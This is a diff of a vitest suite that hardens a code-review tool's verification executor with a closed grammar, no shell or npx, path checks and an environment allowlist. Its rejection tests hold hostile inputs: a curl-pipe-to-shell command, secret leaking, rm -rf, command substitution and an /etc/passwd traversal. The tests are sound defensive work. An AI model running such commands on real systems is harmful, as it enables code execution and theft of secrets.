@@ -1,5 +1,5 @@
 import { describe, it, expect, afterAll } from 'vitest'
-import { readFileSync, mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs'
+import { readFileSync, mkdtempSync, mkdirSync, writeFileSync, rmSync, symlinkSync } from 'node:fs'
 import { spawnSync } from 'node:child_process'
 import { tmpdir } from 'node:os'
 import path from 'node:path'
@@ -25,6 +25,7 @@ import {
   validateReviewResult,
   decideVerdict,
   parseVerificationCommand,
+  verificationPathError,
   verificationEnv,
   VERIFICATION_FORMS,
   VERIFICATION_ENV_KEYS,
@@ -1782,39 +1783,32 @@ describe('there is no working-tree contract loader to fall back to', () => {
 // ---------------------------------------------------------------------------
 
 describe('verification runs under a closed grammar, without a shell', () => {
-  // The authority this bounds: `verification` is a list of strings in a sealed
-  // contract, and the contract validator does not constrain them at all. Given
-  // a shell, writing a string there would have granted arbitrary execution with
-  // the driver's environment — and production_effect: none would not have
-  // stopped it. The executor refuses instead, which needs no schema change.
-
-  it('accepts exactly the two forms this repository actually uses', () => {
-    expect(VERIFICATION_FORMS.map(f => f.form)).toEqual(['npm run <script>', 'npx vitest run <path>'])
-    expect(parseVerificationCommand('npm run verify:pr').argv).toEqual(['npm', 'run', 'verify:pr'])
-    expect(parseVerificationCommand('npx vitest run review-protocol.test.mjs').argv)
-      .toEqual(['npx', 'vitest', 'run', 'review-protocol.test.mjs'])
+  it('accepts the two forms this repository actually uses', () => {
+    expect(parseVerificationCommand('npm run verify:pr').plan)
+      .toEqual({ kind: 'npm-run', command: 'npm', args: ['run', 'verify:pr'] })
+    expect(parseVerificationCommand('npx vitest run review-protocol.test.mjs').plan)
+      .toEqual({ kind: 'local-bin', bin: 'vitest', args: ['run', 'review-protocol.test.mjs'],
+        pathArg: 'review-protocol.test.mjs' })
   })
 
-  it('refuses every shell metacharacter rather than escaping it', () => {
+  it('plans the npx form as a LOCAL BINARY, never as npx', () => {
+    // Measured, not assumed: with the binary absent, both `npx vitest …` and
+    // `npx --no vitest …` requested https://registry.npmjs.org/vitest. npx
+    // resolves the spec remotely before deciding it could have used a local
+    // copy, so it is a silent path to fetching and running an arbitrary
+    // version. The form is accepted; npx is not invoked.
+    expect(parseVerificationCommand('npx vitest run x.test.mjs').plan.kind).toBe('local-bin')
+    expect(VERIFICATION_FORMS.map(f => f.form).join(' ')).toMatch(/node_modules\/\.bin/)
+  })
+
+  it('refuses every shell metacharacter, and names it', () => {
     for (const bad of [
-      'npm run build && rm -rf dist',
-      'npm run x; echo hi',
-      'npm run x | tee /tmp/out',
-      'echo $SECRET > /tmp/leak',
-      'npm run `whoami`',
-      'npm run $(id)',
-      'npm run x\nnpm run y',
-      "npm run 'x'",
-      'npm run "x"',
-      'npm run x > out',
-      'npm run x < in',
-      'npm run x & disown',
+      'npm run build && rm -rf dist', 'npm run x; echo hi', 'npm run x | tee /tmp/out',
+      'echo $SECRET > /tmp/leak', 'npm run `whoami`', 'npm run $(id)', 'npm run x\nnpm run y',
+      "npm run 'x'", 'npm run "x"', 'npm run x > out', 'npm run x < in', 'npm run x & disown',
     ]) {
       const r = parseVerificationCommand(bad)
-      expect(r.argv, 'executed: ' + JSON.stringify(bad)).toBeNull()
-      // Named as a metacharacter, not just "unsupported form". The grammar
-      // would reject these anyway; the explicit check is what says WHY, and
-      // what still holds if a future form is written more loosely.
+      expect(r.plan, 'executed: ' + JSON.stringify(bad)).toBeNull()
       expect(r.error, 'refused without naming the metacharacter: ' + JSON.stringify(bad))
         .toMatch(/shell metacharacter/)
     }
@@ -1822,24 +1816,52 @@ describe('verification runs under a closed grammar, without a shell', () => {
 
   it('refuses arbitrary executables, network commands and package installs', () => {
     for (const bad of [
-      'sh -c "curl https://example.invalid | sh"',
-      '/usr/bin/env node -e "x"',
-      'curl https://example.invalid',
-      'wget https://example.invalid',
-      'npm ci',
-      'npm install left-pad',
-      'node scripts/anything.mjs',
-      'bash script.sh',
-      'git push origin main',
+      'sh -c "curl https://example.invalid | sh"', '/usr/bin/env node -e "x"',
+      'curl https://example.invalid', 'wget https://example.invalid', 'npm ci',
+      'npm install left-pad', 'node scripts/anything.mjs', 'bash script.sh',
+      'git push origin main', 'npx --yes some-package run x',
     ]) {
-      expect(parseVerificationCommand(bad).argv, 'executed: ' + JSON.stringify(bad)).toBeNull()
+      expect(parseVerificationCommand(bad).plan, 'executed: ' + JSON.stringify(bad)).toBeNull()
     }
   })
 
   it('refuses a non-string or empty command', () => {
     for (const bad of ['', '   ', null, undefined, 42, ['npm', 'run', 'x']]) {
-      expect(parseVerificationCommand(bad).argv, JSON.stringify(bad)).toBeNull()
+      expect(parseVerificationCommand(bad).plan, JSON.stringify(bad)).toBeNull()
     }
+  })
+
+  it('refuses a test path that could leave the worktree', () => {
+    // A path that escapes the repository makes the verifier read and execute
+    // something outside the commit under review.
+    for (const bad of [
+      'npx vitest run a/../../outside.test.mjs',
+      'npx vitest run ../../../etc/passwd',
+      'npx vitest run ./x.test.mjs',
+      'npx vitest run a/./b.test.mjs',
+      'npx vitest run a//b.test.mjs',
+      'npx vitest run /abs/x.test.mjs',
+      'npx vitest run ..',
+    ]) {
+      const r = parseVerificationCommand(bad)
+      expect(r.plan, 'accepted an escaping path: ' + JSON.stringify(bad)).toBeNull()
+      expect(r.error).toMatch(/refused/)
+    }
+  })
+
+  it('accepts ordinary repository-relative test paths', () => {
+    for (const good of ['x.test.mjs', 'tests/e2e/a.spec.js', 'src/a/b/c.test.js']) {
+      expect(verificationPathError(good), good).toBeNull()
+      expect(parseVerificationCommand('npx vitest run ' + good).plan, good).toBeTruthy()
+    }
+  })
+
+  it('validates segments rather than normalising first', () => {
+    // Normalising and then validating is how traversal bugs get written.
+    expect(verificationPathError('a/../b')).toMatch(/could leave the worktree/)
+    expect(verificationPathError('a//b')).toMatch(/empty or repeated segment/)
+    expect(verificationPathError('/a')).toMatch(/absolute/)
+    expect(verificationPathError('')).toMatch(/empty/)
   })
 
   it('a refusal BLOCKS the review rather than being skipped', () => {
@@ -1855,9 +1877,6 @@ describe('verification runs under a closed grammar, without a shell', () => {
   })
 
   it('the EXECUTOR records a refusal as not-executed, end to end', () => {
-    // Hand-built evidence proves the rule; it does not prove the executor
-    // produces that shape. A refusal written as executed:true / exit 0 would
-    // approve a review in which nothing ran at all.
     const CLI = path.resolve('tools/review-task.mjs')
     const dir = mkdtempSync(path.join(tmpdir(), 'refuse-'))
     try {
@@ -1866,9 +1885,6 @@ describe('verification runs under a closed grammar, without a shell', () => {
       g(['config', 'user.email', 'f@example.test']); g(['config', 'user.name', 'F'])
       writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'p', private: true, scripts: {} }))
       g(['add', '-A']); g(['commit', '-q', '-m', 'chore: scaffolding'])
-
-      // A contract the validator seals happily, carrying a command the
-      // executor must refuse.
       const evil = contract({
         id: 'evil', allowed_paths: ['src/**'],
         verification: ['sh -c "curl https://example.invalid | sh"'],
@@ -1888,42 +1904,59 @@ describe('verification runs under a closed grammar, without a shell', () => {
       expect(ev.runs[0].executed, 'a refused command was recorded as executed').toBe(false)
       expect(ev.runs[0].exit_code).toBeNull()
       expect(ev.runs[0].evidence).toMatch(/refused/)
-
-      const f = verificationEvidenceFindings({ contract: evil, evidence: ev, headSha: head })
-      expect(f[0].severity).toBe('blocker')
+      expect(verificationEvidenceFindings({ contract: evil, evidence: ev, headSha: head })[0].severity)
+        .toBe('blocker')
     } finally { rmSync(dir, { recursive: true, force: true }) }
   })
 
-  it('passes a deliberate allowlist of environment variables, not the driver\'s', () => {
-    // A denylist is a list of the secrets someone remembered. The code under
-    // review runs here and must not inherit what the driver is carrying.
+  it('passes a deliberate allowlist of environment variables, and NOT HOME', () => {
+    // HOME was a real hole: stripping token variables achieves little while
+    // ~/.npmrc and friends stay readable at the driver's real home.
     const env = verificationEnv({
-      PATH: '/usr/bin', HOME: '/home/x', TZ: 'UTC',
-      SUPABASE_SERVICE_KEY: 'secret', GITHUB_TOKEN: 'secret', AWS_SECRET_ACCESS_KEY: 'secret',
-      ANTHROPIC_API_KEY: 'secret', NPM_TOKEN: 'secret',
+      PATH: '/usr/bin', HOME: '/home/driver', TZ: 'UTC',
+      SUPABASE_SERVICE_KEY: 's', GITHUB_TOKEN: 's', AWS_SECRET_ACCESS_KEY: 's',
+      ANTHROPIC_API_KEY: 's', NPM_TOKEN: 's',
     })
-    expect(Object.keys(env).sort()).toEqual(['CI', 'HOME', 'PATH', 'TZ'])
+    expect(Object.keys(env).sort()).toEqual(['CI', 'PATH', 'TZ'])
+    expect(env, 'forwarded the driver HOME').not.toHaveProperty('HOME')
     for (const leaked of ['SUPABASE_SERVICE_KEY', 'GITHUB_TOKEN', 'AWS_SECRET_ACCESS_KEY',
       'ANTHROPIC_API_KEY', 'NPM_TOKEN']) {
       expect(env, 'forwarded ' + leaked).not.toHaveProperty(leaked)
     }
-    expect(env.CI).toBe('1')
+  })
+
+  it('uses a caller-supplied home instead, when one is given', () => {
+    const env = verificationEnv({ PATH: '/usr/bin', HOME: '/home/driver' }, { home: '/tmp/fresh', tmpdir: '/tmp/t' })
+    expect(env.HOME).toBe('/tmp/fresh')
+    expect(env.TMPDIR).toBe('/tmp/t')
   })
 
   it('the allowlist names only non-secret operational variables', () => {
     for (const k of VERIFICATION_ENV_KEYS) {
       expect(k, 'suspicious env key in the allowlist: ' + k)
-        .not.toMatch(/TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL|AUTH/i)
+        .not.toMatch(/TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL|AUTH|HOME/i)
     }
   })
 
-  it('the executor never uses a shell', () => {
+  it('the executor never uses a shell and never invokes npx', () => {
     const src = readFileSync('tools/review-task.mjs', 'utf8')
     expect(src).toMatch(/shell: false/)
     expect(src).not.toMatch(/shell: true/)
     expect(src).toMatch(/parseVerificationCommand/)
-    expect(src).toMatch(/env: verificationEnv\(process\.env\)/)
     expect(src, 'forwards the driver environment wholesale').not.toMatch(/\.\.\.process\.env/)
+    // npx is never SPAWNED. It may be named in prose and in a refusal message —
+    // what matters is that it is not an execution target, and that the npx form
+    // resolves to a local binary path instead.
+    expect(src).not.toMatch(/spawnSync\(\s*['"]npx/)
+    expect(src).not.toMatch(/\bfile = ['"]npx['"]/)
+    expect(src).toMatch(/path\.join\(root, 'node_modules', '\.bin', plan\.bin\)/)
+  })
+
+  it('never installs: no npm ci or npm install anywhere in the executor', () => {
+    const src = readFileSync('tools/review-task.mjs', 'utf8')
+    expect(src).not.toMatch(/'ci'/)
+    expect(src).not.toMatch(/'install'/)
+    expect(src).toMatch(/will not\s*\n?\s*\/\/?\s*install from the network|does not fall back to npx or the network/)
   })
 })
 
@@ -1979,6 +2012,230 @@ describe('the executor bounds form and authority, not behaviour', () => {
     expect(doc).toMatch(/runs arbitrary code from the commit under review/i)
     expect(doc).toMatch(/Running the tests is running the code/i)
     expect(doc).toMatch(/closed grammar/i)
-    expect(doc).toMatch(/does not inherit what the driver is carrying/i)
+    expect(doc).toMatch(/prevents inheritance of unspecified \*\*environment variables\*\*/i)
+    expect(doc).toMatch(/A fresh home is not a sandbox/i)
+    expect(doc).toMatch(/who generated it is not authenticated/i)
+  })
+})
+
+// ---------------------------------------------------------------------------
+// The verifier must work against DEPENDENCY-REQUIRING verification, not only
+// `node -e` fixtures that need nothing installed.
+// ---------------------------------------------------------------------------
+
+describe('verification works when the commands actually need dependencies', () => {
+  // The gap a synthetic fixture hid: a detached worktree has no node_modules,
+  // so the real contract's `npm run verify:pr` failed with
+  // "Cannot find package '@eslint/js'" while `npm run ok` -> `node -e` passed.
+  // These use a real installed dependency, resolved through node_modules/.bin.
+  const CLI = path.resolve('tools/review-task.mjs')
+  const dirs = []
+  afterAll(() => { for (const d of dirs) rmSync(d, { recursive: true, force: true }) })
+
+  /** A repo whose verification needs a binary that only exists in node_modules. */
+  const depRepo = ({ driverLockfileDiffers = false, verification = ['npm run check', 'npx vitest run probe.test.mjs'] } = {}) => {
+    const dir = mkdtempSync(path.join(tmpdir(), 'deps-'))
+    dirs.push(dir)
+    const g = (args) => spawnSync('git', args, { cwd: dir, encoding: 'utf8' })
+    g(['init', '-q', '-b', 'main'])
+    g(['config', 'user.email', 'f@example.test']); g(['config', 'user.name', 'F'])
+    writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
+      name: 'dep-fixture', private: true, type: 'module',
+      scripts: { check: 'vitest run probe.test.mjs' },
+    }, null, 2))
+    writeFileSync(path.join(dir, 'package-lock.json'), readFileSync(path.resolve('package-lock.json')))
+    writeFileSync(path.join(dir, 'probe.test.mjs'),
+      "import { it, expect } from 'vitest'\nit('runs from a real dependency', () => { expect(1).toBe(1) })\n")
+    writeFileSync(path.join(dir, '.gitignore'), 'node_modules\n')
+    g(['add', '-A']); g(['commit', '-q', '-m', 'chore: scaffolding'])
+
+    const c = contract({
+      id: 'deps', allowed_paths: ['src/**'], verification,
+    })
+    mkdirSync(path.join(dir, TASKS_DIR), { recursive: true })
+    writeFileSync(path.join(dir, TASKS_DIR, 'deps.json'), JSON.stringify(c, null, 2))
+    g(['add', '-A']); g(['commit', '-q', '-m', 'governance: seal deps'])
+    mkdirSync(path.join(dir, 'src'), { recursive: true })
+    writeFileSync(path.join(dir, 'src', 'a.js'), 'export const x = 1\n')
+    g(['add', '-A']); g(['commit', '-q', '-m', 'feat: work'])
+    // The fixture repo plays the DRIVER CHECKOUT, so it has dependencies
+    // installed the way a real checkout does — ignored and uncommitted.
+    symlinkSync(path.resolve('node_modules'), path.join(dir, 'node_modules'), 'dir')
+    const head = g(['rev-parse', 'HEAD']).stdout.trim()
+    if (driverLockfileDiffers) {
+      // The realistic unsound case: the driver's checkout has dependencies
+      // installed for one graph while the commit under review declares another.
+      // Committed at head stays as it was; the driver's working copy moves.
+      writeFileSync(path.join(dir, 'package-lock.json'),
+        JSON.stringify({ name: 'something-else', lockfileVersion: 3 }, null, 2))
+    }
+    return { dir, head, contract: c }
+  }
+
+  it('runs both a dependency-requiring npm script and a local binary', () => {
+    const r = depRepo()
+    const out = spawnSync('node', [CLI, 'verify', '--task', 'deps', '--head', r.head],
+      { cwd: r.dir, encoding: 'utf8' })
+    expect(out.status, out.stderr).toBe(0)
+    const ev = JSON.parse(out.stdout)
+    expect(ev.runs).toHaveLength(2)
+    for (const run of ev.runs) {
+      expect(run.executed, run.command + ' did not execute: ' + run.evidence).toBe(true)
+      expect(run.exit_code, run.command + ' failed: ' + run.evidence).toBe(0)
+    }
+    // Both really ran vitest, not a stub.
+    expect(ev.runs.map(x => x.evidence).join()).toMatch(/1 passed/)
+    expect(verificationEvidenceFindings({ contract: r.contract, evidence: ev, headSha: r.head }))
+      .toEqual([])
+  })
+
+  it('never reaches the network — no registry request appears in the evidence', () => {
+    // The failure this pins: `npx vitest …` with the binary absent requested
+    // https://registry.npmjs.org/vitest. Resolving the local binary instead
+    // means a missing dependency fails closed rather than fetching one.
+    const r = depRepo()
+    const ev = JSON.parse(spawnSync('node', [CLI, 'verify', '--task', 'deps', '--head', r.head],
+      { cwd: r.dir, encoding: 'utf8' }).stdout)
+    const all = ev.runs.map(x => x.evidence).join('\n')
+    expect(all).not.toMatch(/registry\.npmjs\.org/)
+    expect(all).not.toMatch(/SELF_SIGNED_CERT_IN_CHAIN|ETARGET|ENOTFOUND/)
+  })
+
+  it('REFUSES to share dependencies when the lockfiles differ', () => {
+    // Sharing is only sound if the reviewed commit declares the same graph.
+    // Otherwise head A would be verified against head B's dependencies.
+    const r = depRepo({ driverLockfileDiffers: true })
+    const out = spawnSync('node', [CLI, 'verify', '--task', 'deps', '--head', r.head],
+      { cwd: r.dir, encoding: 'utf8' })
+    expect(out.status, out.stderr).toBe(0)
+    const ev = JSON.parse(out.stdout)
+    for (const run of ev.runs) {
+      expect(run.executed, 'ran against the wrong dependency graph').toBe(false)
+      expect(run.evidence).toMatch(/differs from the driver checkout/)
+    }
+    expect(verificationEvidenceFindings({ contract: r.contract, evidence: ev, headSha: r.head })[0].severity)
+      .toBe('blocker')
+  })
+
+  it('REFUSES a local binary that is not installed, with the reason', () => {
+    // Without this the spawn would ENOENT and also record executed:false — but
+    // the reviewer would read a raw errno instead of being told the executor
+    // deliberately will not fetch the missing tool. The refusal has to say why.
+    const r = depRepo({ verification: ['npx nosuchbin run probe.test.mjs'] })
+    const out = spawnSync('node', [CLI, 'verify', '--task', 'deps', '--head', r.head],
+      { cwd: r.dir, encoding: 'utf8' })
+    expect(out.status, out.stderr).toBe(0)
+    const ev = JSON.parse(out.stdout)
+    expect(ev.runs[0].executed).toBe(false)
+    expect(ev.runs[0].exit_code).toBeNull()
+    expect(ev.runs[0].evidence).toMatch(/node_modules\/\.bin\/nosuchbin is not present/)
+    expect(ev.runs[0].evidence, 'did not say it refuses to fetch the missing tool')
+      .toMatch(/does not fall back to npx or the network/)
+    expect(ev.runs[0].evidence).not.toMatch(/ENOENT|spawn/)
+  })
+
+  it('leaves no shared node_modules behind in the driver checkout', () => {
+    const r = depRepo()
+    spawnSync('node', [CLI, 'verify', '--task', 'deps', '--head', r.head], { cwd: r.dir, encoding: 'utf8' })
+    const listed = spawnSync('git', ['worktree', 'list', '--porcelain'], { cwd: r.dir, encoding: 'utf8' })
+      .stdout.split('\n').filter(l => l.startsWith('worktree '))
+    expect(listed, 'verification worktree left registered').toHaveLength(1)
+  })
+})
+
+// ---------------------------------------------------------------------------
+// FINDING 5: the brief must not label unvalidated evidence as exact-head
+// ---------------------------------------------------------------------------
+
+describe('the brief refuses to present evidence it has not validated', () => {
+  // decide blocking afterwards keeps the MERGE safe but not the REVIEW: the
+  // reviewer would already have been shown another commit's results, or an
+  // incomplete set, under the heading "Verification, executed for you at <sha>".
+  const CLI = path.resolve('tools/review-task.mjs')
+  const dirs = []
+  afterAll(() => { for (const d of dirs) rmSync(d, { recursive: true, force: true }) })
+
+  const repo = () => {
+    const dir = mkdtempSync(path.join(tmpdir(), 'brief-ev-'))
+    dirs.push(dir)
+    const g = (args) => spawnSync('git', args, { cwd: dir, encoding: 'utf8' })
+    g(['init', '-q', '-b', 'main'])
+    g(['config', 'user.email', 'f@example.test']); g(['config', 'user.name', 'F'])
+    writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
+      name: 'p', private: true, scripts: { ok: 'node -e "console.log(1)"', two: 'node -e "console.log(2)"' },
+    }))
+    g(['add', '-A']); g(['commit', '-q', '-m', 'chore: scaffolding'])
+    const c = contract({ id: 'ev', allowed_paths: ['src/**'], verification: ['npm run ok', 'npm run two'] })
+    mkdirSync(path.join(dir, TASKS_DIR), { recursive: true })
+    writeFileSync(path.join(dir, TASKS_DIR, 'ev.json'), JSON.stringify(c, null, 2))
+    g(['add', '-A']); g(['commit', '-q', '-m', 'governance: seal ev'])
+    mkdirSync(path.join(dir, 'src'), { recursive: true })
+    writeFileSync(path.join(dir, 'src', 'a.js'), 'x\n')
+    g(['add', '-A']); g(['commit', '-q', '-m', 'feat: work'])
+    return { dir, head: g(['rev-parse', 'HEAD']).stdout.trim(), contract: c }
+  }
+
+  const briefWith = (r, evidence) => {
+    const f = path.join(r.dir, '..', 'ev-' + Math.random().toString(36).slice(2) + '.json')
+    writeFileSync(f, JSON.stringify(evidence))
+    return spawnSync('node', [CLI, 'brief', '--task', 'ev', '--head', r.head, '--verification', f],
+      { cwd: r.dir, encoding: 'utf8' })
+  }
+  const full = (r, over = {}) => ({
+    verification_version: VERIFICATION_EVIDENCE_VERSION,
+    head_sha: r.head,
+    runs: r.contract.verification.map(cmd => ({ command: cmd, executed: true, exit_code: 0, evidence: 'ok' })),
+    ...over,
+  })
+
+  it('briefs normally with complete, correctly bound evidence', () => {
+    const r = repo()
+    const out = briefWith(r, full(r))
+    expect(out.status, out.stderr).toBe(0)
+    expect(out.stdout).toMatch(/Verification, executed for you at/)
+  })
+
+  it('REFUSES evidence bound to another commit', () => {
+    const r = repo()
+    const out = briefWith(r, full(r, { head_sha: 'c'.repeat(40) }))
+    expect(out.status, 'briefed another commit\'s results as this commit\'s').not.toBe(0)
+    expect(out.stderr).toMatch(/cannot be presented as this commit's verification/)
+    expect(out.stderr).toMatch(/not bound to the reviewed commit/)
+  })
+
+  it('REFUSES incomplete evidence that omits a required command', () => {
+    const r = repo()
+    const partial = full(r)
+    partial.runs = [partial.runs[0]]
+    const out = briefWith(r, partial)
+    expect(out.status).not.toBe(0)
+    expect(out.stderr).toMatch(/was not executed/)
+  })
+
+  it('REFUSES malformed evidence and an unsupported version', () => {
+    const r = repo()
+    for (const bad of [full(r, { verification_version: 2 }), full(r, { runs: 'all good' }), {}]) {
+      expect(briefWith(r, bad).status, JSON.stringify(bad).slice(0, 60)).not.toBe(0)
+    }
+  })
+
+  it('REFUSES a duplicate standing in for a missing command', () => {
+    const r = repo()
+    const dup = full(r)
+    dup.runs = [dup.runs[0], { ...dup.runs[0] }]
+    expect(briefWith(r, dup).status).not.toBe(0)
+  })
+
+  it('SHOWS a genuinely failed required command honestly, rather than hiding it', () => {
+    // The distinction that matters: invalid evidence is refused; a real failure
+    // is evidence, and the reviewer must see it. Turning a failing test into
+    // "invalid evidence" would hide the very thing worth reviewing.
+    const r = repo()
+    const failed = full(r)
+    failed.runs[1] = { command: r.contract.verification[1], executed: true, exit_code: 1, evidence: '2 tests failed' }
+    const out = briefWith(r, failed)
+    expect(out.status, out.stderr).toBe(0)
+    expect(out.stdout).toContain('2 tests failed')
+    expect(out.stdout).toMatch(/exit: 1/)
   })
 })
